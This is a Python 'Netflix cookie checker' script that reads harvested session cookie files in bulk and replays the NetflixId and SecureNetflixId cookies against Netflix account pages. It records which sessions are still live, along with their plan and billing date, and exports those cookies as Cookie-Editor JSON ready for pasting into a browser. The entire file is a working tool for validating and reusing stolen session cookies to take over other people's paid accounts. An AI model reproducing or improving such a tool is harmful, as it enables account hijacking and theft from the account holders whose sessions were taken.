#!/usr/bin/env python3
import os
import re
import requests
import time
import json
import signal
import sys
import shutil
from datetime import datetime
from collections import Counter

# Global state
live_accounts = []
count = 0
fourk_count = 0
ACTIVE_COOKIES_DIR = "Active_Cookies"

def signal_handler(sig, frame):
    """Handle CTRL+C - save progress before exit."""
    print("\n\n[!] CTRL+C detected! Saving progress...")
    save_results()
    print("[!] Exiting gracefully.")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)


def _decode_cookie_val(val):
    if isinstance(val, str):
        return val.strip()
    return val


def parse_netscape_lines(text):
    """Parse Netscape cookie format text into dictionary."""
    cookies = {}
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        parts = line.split('\t')
        if len(parts) >= 7:
            key = parts[5].strip()
            val = parts[6].strip()
            if key in ('NetflixId', 'SecureNetflixId', 'nfvdid', 'OptanonConsent'):
                cookies[key] = val
    return cookies


def parse_json_cookies(text):
    """Parse JSON format cookies into dictionary."""
    cookies = {}
    try:
        data = json.loads(text)
    except Exception:
        return cookies

    if isinstance(data, list):
        for item in data:
            if isinstance(item, dict):
                name = item.get('name')
                val = item.get('value')
                if name in ('NetflixId', 'SecureNetflixId', 'nfvdid', 'OptanonConsent') and val:
                    cookies[name] = str(val).strip()
    elif isinstance(data, dict):
        for name in ('NetflixId', 'SecureNetflixId', 'nfvdid', 'OptanonConsent'):
            if name in data and data[name]:
                cookies[name] = str(data[name]).strip()
    return cookies


def parse_raw_kv_cookies(text):
    """Parse raw key-value cookie strings into dictionary."""
    cookies = {}
    for name in ('NetflixId', 'SecureNetflixId', 'nfvdid', 'OptanonConsent'):
        m = re.search(rf'(?<!\w){name}=([^\s;|\n]+)', text)
        if m:
            cookies[name] = m.group(1).strip()
    return cookies


def extract_cookies_from_text(text):
    """Try Netscape, JSON, and raw key-value parsing."""
    cookies = parse_netscape_lines(text)
    if 'NetflixId' not in cookies:
        cookies.update(parse_json_cookies(text))
    if 'NetflixId' not in cookies:
        cookies.update(parse_raw_kv_cookies(text))
    return cookies


def extract_email_from_filepath_or_text(filepath, text):
    """Extract email from file name, header text, or email pattern."""
    if filepath:
        basename = os.path.basename(filepath)
        # Check patterns like [email@domain.com] or ID_email@domain.com
        m = re.search(r'\[([^\]]+@[^\]]+)\]', basename)
        if m:
            return m.group(1).strip()
        m = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', basename)
        if m:
            return m.group(1).strip()

    # Search in text header lines
    for line in text.splitlines()[:20]:
        m = re.search(r'(?:Email|👤|📧)\s*[:：]?\s*([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', line, re.I)
        if m:
            return m.group(1).strip()

    # General search in text
    m = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', text)
    if m:
        return m.group(1).strip()

    return "unknown_account"


def read_cookie_file(filepath):
    """Read a single cookie file and return standardized account dict."""
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            text = f.read()
    except Exception as e:
        print(f"[!] Error reading {filepath}: {e}")
        return None

    cookies = extract_cookies_from_text(text)
    if not cookies or 'NetflixId' not in cookies:
        return None

    email = extract_email_from_filepath_or_text(filepath, text)

    country = "Unknown"
    m_country = re.search(r'Country\s*[:：]\s*(.+)', text, re.I)
    if m_country:
        country = m_country.group(1).strip()

    plan = "Live"
    m_plan = re.search(r'Plan\s*[:：]\s*(.+)', text, re.I)
    if m_plan:
        plan = m_plan.group(1).strip()

    return {
        'email': email,
        'filepath': filepath,
        'cookies': cookies,
        'raw_text': text,
        'plan': plan,
        'billing_date': '',
        'streams': '',
        'payment_method': '',
        'metadata': {'country': country}
    }


def generate_cookie_json(account):
    """Generate Cookie-Editor compatible JSON untuk 1 akun."""
    cookies = account['cookies']
    if 'NetflixId' not in cookies or 'SecureNetflixId' not in cookies:
        return None

    result = []
    for name in ('NetflixId', 'SecureNetflixId', 'nfvdid', 'OptanonConsent'):
        if cookies.get(name):
            result.append({
                "domain": ".netflix.com",
                "name": name,
                "path": "/",
                "secure": True,
                "httpOnly": name in ('NetflixId', 'SecureNetflixId'),
                "sameSite": "unspecified",
                "value": cookies[name]
            })
    return result


def generate_netscape_lines(account):
    """Generate Netscape formatted cookie string."""
    cookies = account['cookies']
    lines = []
    lines.append("# Netscape HTTP Cookie File")
    lines.append("# https://curl.haxx.se/rfc/cookie_spec.html")
    lines.append("# This is a generated file!  Do not edit.")
    lines.append("")

    for name in ('NetflixId', 'SecureNetflixId', 'nfvdid', 'OptanonConsent'):
        val = cookies.get(name)
        if val:
            http_only = "TRUE" if name in ('NetflixId', 'SecureNetflixId') else "FALSE"
            lines.append(f".netflix.com\tTRUE\t/\t{http_only}\t1893456000\t{name}\t{val}")
    return "\n".join(lines)


def save_active_cookie(account, date, res):
    """Save live account's cookie file into Active_Cookies directory."""
    if not os.path.exists(ACTIVE_COOKIES_DIR):
        os.makedirs(ACTIVE_COOKIES_DIR, exist_ok=True)

    safe_email = re.sub(r'[^\w\-.]', '_', account['email'])
    country = account.get('metadata', {}).get('country', 'XX')
    country_code = re.sub(r'[^\w]', '', country)[:10] or "NETFLIX"

    filename = f"LIVE_{country_code}_{safe_email}.txt"
    dest_path = os.path.join(ACTIVE_COOKIES_DIR, filename)

    # Save format with header info + Netscape cookies
    with open(dest_path, 'w', encoding='utf-8') as f:
        f.write(f"# Netflix Account: {account['email']}\n")
        f.write(f"# Plan: {res} | Next Billing: {date}\n")
        f.write(f"# Checked Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("# ========================================\n\n")
        f.write(generate_netscape_lines(account))
        f.write("\n\n# JSON Format (Cookie-Editor):\n")
        cookie_json = generate_cookie_json(account)
        if cookie_json:
            f.write(json.dumps(cookie_json, indent=4, ensure_ascii=False))
            f.write("\n")


def save_results():
    """Save live accounts ke live.txt & Active_Cookies folder."""
    global live_accounts, count, fourk_count

    if not live_accounts:
        print("[!] No live accounts to save.")
        return

    with open('live.txt', 'w', encoding='utf-8') as f:
        f.write(f"NETFLIX CHECKER - {count} LIVE\n")
        f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("=" * 80 + "\n\n")

        for i, (acc, date, res) in enumerate(live_accounts, 1):
            f.write(f"[{i:2d}] {acc['email']}\n")
            f.write(f"     Plan: {res} | Billing: {date}\n")
            f.write(f"     Payment: {acc.get('payment_method', '-')} | Streams: {acc.get('streams', '-')}\n")
            f.write(f"     Country: {acc.get('metadata', {}).get('country', '-')}\n")
            f.write("     🍪 Cookie JSON (copy & paste ke Cookie-Editor):\n")
            cookie_json = generate_cookie_json(acc)
            if cookie_json:
                f.write(json.dumps(cookie_json, indent=4, ensure_ascii=False))
                f.write("\n")
            f.write("-" * 60 + "\n")

    print(f"\n✅ Saved: live.txt ({count} accounts)")
    print(f"📁 Active cookie files exported to: '{ACTIVE_COOKIES_DIR}/'")

    print(f"\n{'=' * 60}")
    print(f"🔥 LIVE: {count} | 4K: {fourk_count}")

    stats = Counter(res for _, _, res in live_accounts)
    for plan_name, num in stats.most_common():
        print(f"  {plan_name}: {num}")
    print(f"{'=' * 60}")


def check_netflix_account(account_data):
    """Check Netflix account using extracted cookies."""
    cookies = account_data['cookies']

    if 'NetflixId' not in cookies or 'SecureNetflixId' not in cookies:
        return False, account_data.get('billing_date', ''), account_data.get('plan', 'No Cookie')

    for k in ['NetflixId', 'SecureNetflixId']:
        if k in cookies:
            cookies[k] = cookies[k].strip().rstrip('.')

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://www.netflix.com/browse',
        'Cache-Control': 'max-age=0'
    }

    try:
        session = requests.Session()
        session.get('https://www.netflix.com/browse', headers=headers, cookies=cookies, timeout=12)
        time.sleep(0.5)

        headers['Cookie'] = '; '.join(f"{k}={cookies[k]}" for k in cookies)
        r = session.get('https://www.netflix.com/account/membership', headers=headers, timeout=12)

        if r.status_code != 200:
            return False, account_data.get('billing_date', ''), account_data.get('plan', 'Invalid Session')

        html = r.text

        if re.search(r'4K video resolution[^<]*?(?:spatial audio|ad-free)', html, re.I):
            plan_detected = '4K 🔥'
        else:
            plan_match = re.search(
                r'data-uia="account-membership-page\+plan-card\+title"[^>]*>([^<]{1,30}?)<',
                html
            )
            plan_detected = plan_match.group(1).strip() if plan_match else account_data.get('plan', 'Live')

        date_match = re.search(
            r'<h3[^>]*data-uia="account-membership-page\+payments-card\+title"[^>]*>Next payment</h3>[^<]*<p[^>]*data-uia="account-membership-page\+payments-card\+description"[^>]*>([^<]+?)</p>',
            html,
            re.DOTALL | re.I
        )

        date = date_match.group(1).strip() if date_match else account_data.get('billing_date', 'Live')

        if 'account-membership-page' in html or 'data-uia="account-membership-page' in html or 'plan-card' in html:
            return True, date, plan_detected

        return False, account_data.get('billing_date', ''), account_data.get('plan', 'Dead')
    except Exception as e:
        return False, account_data.get('billing_date', ''), account_data.get('plan', f'Error: {e}')


def process_accounts_list(accounts):
    """Process checking for a list of account dicts."""
    global live_accounts, count, fourk_count

    print(f"\n🚀 Starting check for {len(accounts)} account(s)...\n")
    print("[INFO] Press CTRL+C at any time to save progress and exit.\n")

    for i, acc in enumerate(accounts, 1):
        email_disp = (acc['email'][:28] + '...') if len(acc['email']) > 31 else acc['email']
        print(f"[{i:3d}/{len(accounts)}] Checking {email_disp:<32}...", end=' ', flush=True)

        is_live, date, res = check_netflix_account(acc)

        if is_live:
            count += 1
            if '4K' in res:
                fourk_count += 1
                print(f"🎬 {res} | {date} 🔥 #{count}")
            else:
                print(f"✅ {res} | {date} #{count}")

            live_accounts.append((acc, date, res))
            save_active_cookie(acc, date, res)
        else:
            print(f"❌ {res}")

        time.sleep(1.5)

    save_results()
    print("\n🎉 CHECK COMPLETED!")


def run_single_mode():
    """Single mode: check one file from Cookies/ or user input file/text."""
    print("\n--- SINGLE CHECK MODE ---")
    print("1. Select a file from Cookies/ directory")
    print("2. Enter custom file path")
    print("3. Paste raw cookie text")

    choice = input("\nSelect option (1-3): ").strip()

    if choice == '1':
        cookies_dir = 'Cookies'
        if not os.path.exists(cookies_dir):
            print(f"[!] Directory '{cookies_dir}' not found!")
            return
        files = [f for f in os.listdir(cookies_dir) if f.endswith('.txt')]
        if not files:
            print(f"[!] No .txt files in '{cookies_dir}'")
            return
        print(f"\nFound {len(files)} cookie files in '{cookies_dir}/'.")
        query = input("Filter/search filename (or press Enter to list first 20): ").strip()
        matched = [f for f in files if query.lower() in f.lower()] if query else files[:20]

        for idx, fname in enumerate(matched, 1):
            print(f" [{idx:2d}] {fname}")

        try:
            sel = int(input("\nEnter file number: ").strip())
            target_file = os.path.join(cookies_dir, matched[sel - 1])
        except Exception:
            print("[!] Invalid selection!")
            return

        acc = read_cookie_file(target_file)
        if acc:
            process_accounts_list([acc])
        else:
            print(f"[!] Unable to extract NetflixId cookie from file: {target_file}")

    elif choice == '2':
        target_file = input("Enter file path: ").strip()
        if not os.path.exists(target_file):
            print(f"[!] File not found: {target_file}")
            return
        acc = read_cookie_file(target_file)
        if acc:
            process_accounts_list([acc])
        else:
            print(f"[!] Unable to extract NetflixId cookie from file: {target_file}")

    elif choice == '3':
        print("\nPaste cookie text (press Enter twice or Ctrl+D when done):")
        lines = []
        while True:
            try:
                line = input()
                if not line and lines and not lines[-1]:
                    break
                lines.append(line)
            except EOFError:
                break
        raw_text = "\n".join(lines).strip()
        if not raw_text:
            print("[!] Empty input!")
            return

        cookies = extract_cookies_from_text(raw_text)
        if not cookies or 'NetflixId' not in cookies:
            print("[!] NetflixId cookie not found in input text!")
            return

        email = extract_email_from_filepath_or_text(None, raw_text)
        acc = {
            'email': email,
            'filepath': None,
            'cookies': cookies,
            'raw_text': raw_text,
            'plan': 'Live',
            'billing_date': '',
            'streams': '',
            'payment_method': '',
            'metadata': {'country': 'Unknown'}
        }
        process_accounts_list([acc])
    else:
        print("[!] Invalid choice!")


def run_bulk_mode():
    """Bulk mode: check all files in Cookies/ directory."""
    print("\n--- BULK CHECK MODE ---")
    cookies_dir = 'Cookies'

    if not os.path.exists(cookies_dir):
        print(f"[!] Directory '{cookies_dir}' not found!")
        return

    files = [os.path.join(cookies_dir, f) for f in os.listdir(cookies_dir) if f.endswith('.txt')]
    print(f"📁 Found {len(files)} file(s) in '{cookies_dir}/'")

    if not files:
        print("[!] No cookie files to process.")
        return

    limit = input("Process how many files? (Enter = process all): ").strip()
    if limit.isdigit():
        files = files[:int(limit)]

    accounts = []
    print("\nparsing cookie files...")
    for fpath in files:
        acc = read_cookie_file(fpath)
        if acc:
            accounts.append(acc)

    print(f"✅ Successfully parsed {len(accounts)} valid account cookie(s) out of {len(files)} file(s).")
    if not accounts:
        print("[!] No valid Netflix cookie files found.")
        return

    process_accounts_list(accounts)


def print_banner():
    print(r"""
███╗   ██╗███████╗████████╗███████╗██╗     ██╗██╗  ██╗
████╗  ██║██╔════╝╚══██╔══╝██╔════╝██║     ██║╚██╗██╔╝
██╔██╗ ██║█████╗     ██║   █████╗  ██║     ██║ ╚███╔╝
██║╚██╗██║██╔══╝     ██║   ██╔══╝  ██║     ██║ ██╔██╗
██║ ╚████║███████╗   ██║   ██║     ███████╗██║██╔╝ ██╗
╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝     ╚══════╝╚═╝╚═╝  ╚═╝
╔════════════════════════════════════════════════════╗
║                 Github : YuuAshura                 ║
╚════════════════════════════════════════════════════╝
""")


def main():
    print_banner()

    while True:
        print("\n=== NETFLIX COOKIE CHECKER MENU ===")
        print(" [1] Single Check Mode (Check 1 file / text)")
        print(" [2] Bulk Check Mode (Check all files in Cookies/)")
        print(" [3] Exit")

        choice = input("\nSelect mode (1-3): ").strip()

        if choice == '1':
            run_single_mode()
            break
        elif choice == '2':
            run_bulk_mode()
            break
        elif choice == '3':
            print("Goodbye!")
            break
        else:
            print("[!] Invalid option. Please select 1, 2, or 3.")


if __name__ == "__main__":
    main()
